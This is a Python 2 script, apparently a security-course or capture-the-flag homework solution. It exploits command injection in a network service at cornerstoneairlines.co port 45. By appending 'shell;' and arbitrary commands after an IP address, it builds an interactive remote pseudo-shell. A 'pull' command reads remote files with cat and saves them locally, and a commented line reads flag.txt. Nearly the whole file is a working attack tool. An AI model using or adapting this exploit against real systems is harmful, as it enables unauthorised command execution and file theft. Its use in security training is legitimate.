"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import os 

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd(cmd):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    data = s.recv(1024)  
    #print(data)
    s.send(cmd+ "\n")
    data = s.recv(1024)
    return data
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """


if __name__ == '__main__':
    cmd = raw_input(">") 
    while(cmd != "quit"): 
        cmd = raw_input(">")
        if cmd == "shell":
            curr_dir = execute_cmd("142.93.117.193   shell;pwd") 
            loaded = "shell;"
            while(cmd != "exit"):
                cmd = raw_input(curr_dir.rstrip()+">")
                #execute_cmd("142.93.117.193   shell;   cd /home; ls; cat flag.txt")
                print(execute_cmd("142.93.117.193"+ "     " +loaded+ cmd))
                if "cd" in cmd:
                    curr_dir = execute_cmd("142.93.117.193"+ "     " +loaded+ cmd +";"+ "pwd")
                    curr_dir = curr_dir.split("/",1)[1]
                    if (not curr_dir) or (curr_dir == "\n"):
                        curr_dir = "/"
                    loaded = "shell; cd "+curr_dir.rstrip()+";"
        if cmd == "help":
            print("1. shell\n")
            print("2. pull\n")
            print("3. help\n")
            print("4. quit\n")
        if "pull" in cmd:
            cmd_arry = cmd.split(" ", 3)
            remote_path = "".join(cmd_arry[1])
            info = execute_cmd("142.93.117.193   shell;cat "+remote_path)
            local_path = cmd_arry[2]
            down_file = open(local_path, 'w+')
            down_file.write(info)
            down_file.close()
            

